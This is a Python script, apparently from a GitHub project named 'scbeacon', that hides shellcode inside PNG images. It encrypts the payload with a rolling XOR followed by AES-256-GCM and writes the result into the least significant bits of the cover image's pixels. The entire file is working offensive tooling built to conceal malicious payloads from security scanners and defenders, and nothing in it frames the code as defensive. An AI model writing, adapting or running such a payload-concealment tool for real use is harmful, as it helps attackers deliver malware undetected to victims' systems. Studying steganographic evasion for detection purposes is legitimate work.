#!/usr/bin/env python3
"""
stego_encode.py - Embed shellcode into PNG image via LSB steganography
                  with multi-layer encryption (XOR -> AES-256-GCM)

Usage:
    python stego_encode.py -i cover.png -s shellcode.bin -o output.png -p "password"
    python stego_encode.py -i cover.png -s shellcode.bin -o output.png -p "password" -k 0xAB

Dependencies:
    pip install pillow cryptography
    
Author : https://github.com/kcnewb1e/scbeacon
"""

import argparse
import os
import struct
import sys
from pathlib import Path
from PIL import Image
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Magic bytes to identify our payload
MAGIC = b'\xDE\xAD\xC0\xDE'

# Default XOR key (1 byte) — applied as layer 1 before AES
DEFAULT_XOR_KEY = 0xAB

# PBKDF2 iterations
KDF_ITERATIONS = 200_000
SALT_LEN  = 16   # bytes
NONCE_LEN = 12   # bytes (AES-GCM standard)
KEY_LEN   = 32   # bytes (AES-256)


def derive_keys(password: str, salt: bytes, base_xor_key: int) -> tuple[bytes, int]:
    """Derive AES key (32 bytes) + 1-byte XOR key from password via PBKDF2."""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=KEY_LEN + 1,
        salt=salt,
        iterations=KDF_ITERATIONS,
    )
    key_material = kdf.derive(password.encode())
    aes_key = key_material[:KEY_LEN]
    xor_key = key_material[KEY_LEN] ^ base_xor_key
    return aes_key, xor_key


def layer1_xor(data: bytes, key: int) -> bytes:
    """Layer 1: rolling XOR — key mutates each byte."""
    out = bytearray(len(data))
    k = key
    for i, b in enumerate(data):
        out[i] = b ^ k
        k = (k ^ out[i] ^ (i & 0xFF)) & 0xFF  # key evolves
    return bytes(out)


def layer2_aes_gcm(data: bytes, aes_key: bytes, nonce: bytes) -> bytes:
    """Layer 2: AES-256-GCM authenticated encryption."""
    aesgcm = AESGCM(aes_key)
    return aesgcm.encrypt(nonce, data, None)


def encrypt_payload(shellcode: bytes, password: str, base_xor_key: int) -> tuple[bytes, bytes, bytes]:
    """Apply both encryption layers and return (salt, nonce, ciphertext)."""
    salt  = os.urandom(SALT_LEN)
    nonce = os.urandom(NONCE_LEN)
    aes_key, xor_key = derive_keys(password, salt, base_xor_key)

    step1 = layer1_xor(shellcode, xor_key)   # Layer 1: rolling XOR
    step2 = layer2_aes_gcm(step1, aes_key, nonce)  # Layer 2: AES-256-GCM

    return salt, nonce, step2


def bytes_to_bits(data: bytes) -> list[int]:
    bits = []
    for byte in data:
        for i in range(7, -1, -1):
            bits.append((byte >> i) & 1)
    return bits


def embed(cover_path: str, shellcode_path: str, output_path: str, password: str, base_xor_key: int):
    # Load shellcode
    shellcode = Path(shellcode_path).read_bytes()
    print(f"[*] Shellcode size : {len(shellcode)} bytes")

    # Multi-layer encrypt
    salt, nonce, ciphertext = encrypt_payload(shellcode, password, base_xor_key)
    print(f"[*] Encrypted size : {len(ciphertext)} bytes")
    print(f"[*] Salt           : {salt.hex()}")
    print(f"[*] Nonce          : {nonce.hex()}")

    # Build header:
    #   MAGIC    (4 bytes)
    #   SALT_LEN (2 bytes, uint16 LE)
    #   NONCE_LEN(2 bytes, uint16 LE)
    #   PAYLOAD_LEN (4 bytes, uint32 LE)
    #   SALT     (variable)
    #   NONCE    (variable)
    #   CIPHERTEXT
    header = (
        MAGIC
        + struct.pack('<HH', len(salt), len(nonce))
        + struct.pack('<I', len(ciphertext))
        + salt
        + nonce
    )
    full_data = header + ciphertext

    # Convert to bits
    bits = bytes_to_bits(full_data)
    bits_needed = len(bits)

    # Load cover image
    img = Image.open(cover_path).convert('RGB')
    width, height = img.size
    pixels = list(img.getdata())

    # Capacity check: 3 bits per pixel (1 per channel)
    capacity_bits = width * height * 3
    if bits_needed > capacity_bits:
        print(f"[-] Image too small!")
        print(f"    Need   : {bits_needed} bits ({bits_needed // 8} bytes)")
        print(f"    Have   : {capacity_bits} bits ({capacity_bits // 8} bytes)")
        print(f"    Min image size for this payload: {bits_needed // 3 + 1} pixels")
        sys.exit(1)

    print(f"[*] Image size     : {width}x{height} ({capacity_bits // 8} bytes capacity)")
    print(f"[*] Payload size   : {len(full_data)} bytes ({bits_needed} bits)")
    print(f"[*] Usage          : {bits_needed / capacity_bits * 100:.2f}%")

    # Flatten pixel channels
    flat = []
    for r, g, b in pixels:
        flat.extend([r, g, b])

    # Embed bits into LSB of each channel value
    for i, bit in enumerate(bits):
        flat[i] = (flat[i] & 0xFE) | bit

    # Reconstruct pixel tuples
    new_pixels = [
        (flat[i], flat[i + 1], flat[i + 2])
        for i in range(0, len(flat), 3)
    ]

    # Save output as PNG (lossless - required for LSB integrity)
    img.putdata(new_pixels)
    img.save(output_path, 'PNG')
    print(f"[+] Saved stego image: {output_path}")


def main():
    parser = argparse.ArgumentParser(description='Embed shellcode into PNG via LSB (multi-layer encryption)')
    parser.add_argument('-i', '--image',     required=True,  help='Cover image (input)')
    parser.add_argument('-s', '--shellcode', required=True,  help='Shellcode binary file')
    parser.add_argument('-o', '--output',    required=True,  help='Output PNG path')
    parser.add_argument('-p', '--password',  required=True,  help='Encryption password (used for key derivation)')
    parser.add_argument('-k', '--key',       default=hex(DEFAULT_XOR_KEY),
                        help=f'Base XOR key byte mixed with derived key (default: {hex(DEFAULT_XOR_KEY)})')
    args = parser.parse_args()

    base_xor_key = int(args.key, 16) & 0xFF

    print(f"[*] Password       : {'*' * len(args.password)}")
    print(f"[*] Base XOR key   : {hex(base_xor_key)}")
    print(f"[*] KDF iterations : {KDF_ITERATIONS:,}")
    print(f"[*] Encryption     : Rolling-XOR -> AES-256-GCM")

    embed(args.image, args.shellcode, args.output, args.password, base_xor_key)


if __name__ == '__main__':
    main()
